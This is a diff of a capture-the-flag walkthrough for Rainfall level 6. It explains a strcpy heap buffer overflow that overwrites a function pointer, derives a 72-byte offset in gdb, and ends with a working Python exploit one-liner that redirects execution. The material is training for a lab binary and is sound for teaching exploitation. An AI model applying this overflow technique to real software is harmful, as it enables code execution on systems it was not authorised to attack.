@@ -1,4 +1,4 @@
-# Rainfall - Level3 Walkthrough
+# Rainfall - Level6 Walkthrough
 
 We copy the file `/home/user/level6/level6` locally:
 
@@ -13,9 +13,10 @@ Open the binary in Ghidra.
 
 We want to call function `n`, that would print the flag.
 
-The call to strcpy is dangerous and result to heap buffer overflow for large enough input, as the buffer is only 64 bytes.
+strcpy does not check length, this is dangerous and result to heap buffer overflow for large enough input, as the buffer is only 64 bytes.
+If argv[1] > 64 bytes → heap buffer overflow
 
-The allocations are consecutive on the heap in many allocators.
+The allocations are consecutive on the heap, so we can overlflow up to `fn`.
 
 in gdb 
 We break right after the 2 malloc
@@ -30,7 +31,7 @@ eax is respectively
 
 0x804a050 − 0x804a008 = 0x48 = 72 (in base 10)
 
-So we need a padding of 72, followed by the address of `n` in little endian. The address of `n` will then be found in var `puVar1` which is later called.
+So we need a padding of 72, followed by the address of `n` in little endian. The address of `n` will then be found in var `fn` which is later called.
 
 ```bash
 gdb ./level6
@@ -46,3 +47,5 @@ The function `n` we target has address `0x08048454` which gives little endian `\
 ```bash
 ./level6 $(python -c "print 'A'*72 + '\x54\x84\x04\x08'")
 ```
+
+The flag is printed directly
